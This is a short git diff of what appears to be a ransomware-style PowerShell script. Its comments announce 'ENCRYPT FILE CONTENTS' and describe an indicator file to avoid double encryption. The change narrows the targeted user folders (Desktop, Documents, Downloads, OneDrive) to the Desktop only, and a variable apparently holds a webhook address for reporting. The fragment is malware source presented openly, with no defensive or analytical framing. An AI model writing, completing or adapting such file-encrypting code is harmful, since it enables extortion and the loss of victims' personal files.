@@ -40,7 +40,7 @@ add-type -name win -member $Import -namespace native;
 # ENCRYPT FILE CONTENTS
 # Define setup variables
 $whuri = "$dc"
-$SourceFolder = "$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
+$SourceFolder = "$env:USERPROFILE\Desktop" #,"$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive"
 $files = Get-ChildItem -Path $SourceFolder -File -Recurse
 
 # Generate the indcator file (for pop-up close detection and to avoid double encryption)
